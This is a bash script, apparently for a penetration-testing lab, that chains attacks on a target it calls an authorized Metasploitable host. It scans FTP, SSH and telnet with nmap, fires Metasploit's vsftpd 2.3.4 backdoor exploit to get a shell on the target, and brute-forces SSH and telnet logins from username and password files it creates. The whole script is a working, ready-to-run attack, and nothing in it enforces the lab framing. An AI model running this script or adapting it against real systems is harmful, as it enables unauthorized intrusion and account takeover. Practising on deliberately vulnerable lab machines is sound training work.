#!/bin/bash
read -rp "Authorized Metasploitable target IP [192.168.1.4]: " RHOST
RHOST=${RHOST:-192.168.1.4}
read -rp "Kali Linux IP [192.168.1.5]: " LHOST
LHOST=${LHOST:-192.168.1.5}
ip addr
nmap -sV -p 21,22,23 "$RHOST"
mkdir -p "$HOME"
printf 'msfadmin\nuser\n' > "$HOME/users.txt"
printf 'msfadmin\npassword\n' > "$HOME/password.txt"
msfconsole -q -x "search vsftpd 2.3.4; use exploit/unix/ftp/vsftpd_234_backdoor; show options; show payloads; set RHOSTS $RHOST; set LHOST $LHOST; run; exit -y"
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS $RHOST; set VERBOSE true; set STOP_ON_SUCCESS true; set USER_FILE $HOME/users.txt; set PASS_FILE $HOME/password.txt; show options; run; exit -y"
msfconsole -q -x "use auxiliary/scanner/telnet/telnet_login; set RHOSTS $RHOST; set VERBOSE true; set STOP_ON_SUCCESS true; set USER_FILE $HOME/users.txt; set PASS_FILE $HOME/password.txt; show options; run; exit -y"
